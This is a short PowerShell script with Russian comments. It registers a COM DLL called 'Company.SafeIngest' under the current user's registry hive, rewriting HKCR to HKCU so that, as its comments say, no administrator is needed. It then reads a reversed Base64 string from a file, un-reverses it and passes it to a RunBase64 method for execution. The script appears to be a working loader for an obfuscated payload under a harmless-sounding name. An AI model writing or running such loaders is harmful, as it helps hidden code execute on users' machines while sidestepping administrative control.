﻿# === 0) Пути и подготовка
$dllPath = (Resolve-Path ".\Company.SafeIngest.dll").Path
$work    = Join-Path $env:TEMP "SafeIngestReg"
New-Item -ItemType Directory -Force -Path $work | Out-Null

# === 1) Генерация .reg под текущую разрядность процесса PowerShell
if ([Environment]::Is64BitProcess) {
    $regAsm = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
    $regOut = Join-Path $work 'SafeIngest_x64.reg'
} else {
    $regAsm = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
    $regOut = Join-Path $work 'SafeIngest_x86.reg'
}

# /regfile — не пишет в реестр (админ не нужен), /codebase — пропишет абсолютный путь к DLL
& $regAsm $dllPath /codebase /regfile:$regOut | Out-Null

if ($LASTEXITCODE -ne 0 -or -not (Test-Path $regOut)) {
    throw "RegAsm /regfile не создал $regOut (код $LASTEXITCODE)."
}

# === 2) Переписать корень с HKCR на HKCU\Software\Classes
$userReg = Join-Path $work ([IO.Path]::GetFileNameWithoutExtension($regOut) + "_user.reg")
(Get-Content $regOut -Raw) -replace 'HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER\Software\Classes' |
    Set-Content -Encoding ASCII $userReg

# === 3) Импорт в профиль пользователя (без админа)
$import = & reg.exe import "$userReg" 2>&1
if ($LASTEXITCODE -ne 0) {
    throw "Не удалось импортировать $userReg : `n$import"
}

# === 4) Проверка, что ProgID доступен в HKCU
$progKey = 'HKCU:\Software\Classes\Company.SafeIngest'
if (-not (Test-Path $progKey)) {
    throw "ProgID Company.SafeIngest не найден в HKCU после импорта."
}

# === 5) Читаем и разворачиваем Base64 из файла
$revBase64 = Get-Content -Raw -Path "base64.txt"
$chars = $revBase64.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars

# === 6) Создаём COM-объект и запускаем
$com = New-Object -ComObject Company.SafeIngest
if ($null -eq $com) { throw "Не удалось создать COM-объект Company.SafeIngest." }

# Если нужен просто запуск:
$com.RunBase64($fixedBase64)